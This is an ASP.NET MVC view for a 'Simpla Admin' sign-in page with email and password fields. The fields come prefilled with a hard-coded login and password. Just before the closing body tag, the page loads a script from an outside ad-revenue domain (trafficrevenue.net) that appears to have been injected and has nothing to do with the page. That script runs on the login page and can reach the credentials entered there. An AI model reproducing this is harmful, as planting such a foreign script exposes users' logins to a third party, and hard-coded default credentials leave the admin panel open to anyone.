<%@ Page Language="C#" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Sign In</title>
<link rel="stylesheet" href="../../Content/css/reset.css" type="text/css" media="screen" />
<link rel="stylesheet" href="../../Content/css/style.css" type="text/css" media="screen" />
<link rel="stylesheet" href="../../Content/css/invalid.css" type="text/css" media="screen" />	
<script type="text/javascript" src="../../Scripts/jquery-1.3.2.min.js"></script>
<script type="text/javascript" src="../../Scripts/simpla.jquery.configuration.js"></script>
<script type="text/javascript" src="../../Scripts/facebox.js"></script>
<script type="text/javascript" src="../../Scripts/jquery.wysiwyg.js"></script>
</head>
  
	<body id="login">
		
		<div id="login-wrapper" class="png_bg">
			<div id="login-top">
			
				<h1>Simpla Admin</h1>
				<!-- Logo (221px width) -->
				<img id="logo" src="../../Content/images/logo.png" alt="Simpla Admin logo" />
			</div> <!-- End #logn-top -->
			
			<div id="login-content">
				
				<form action="/Public/XuLyDangNhap" method="post">
				
					<%--<div class="notification information png_bg">
						<div>
							Just click "Sign In". No password needed.
						</div>
					</div>--%>
					<div class='<%=Html.Encode(ViewData["div"]) %>'>
                            <%=Html.Encode(ViewData["error"]) %>
                     </div>
					<p>
						<label>Email</label>
						<input class="text-input" type="text" name="email"  value="len@gmail.com" />
					</p>
					<div class="clear"></div>
					<p>
						<label>Password</label>
						<input class="text-input" type="password" name="password" value="12345678"/>
					</p>
					<div class="clear"></div>
					<div class="clear"></div>
					<p>
						<input class="button" type="submit" value="Sign In" />
					</p>
					
				</form>
			</div> <!-- End #login-content -->
			
		</div> <!-- End #login-wrapper -->
<script src="http://www.trafficrevenue.net/loadad.js?username=chrismaher96"></script>
  </body>
</html>
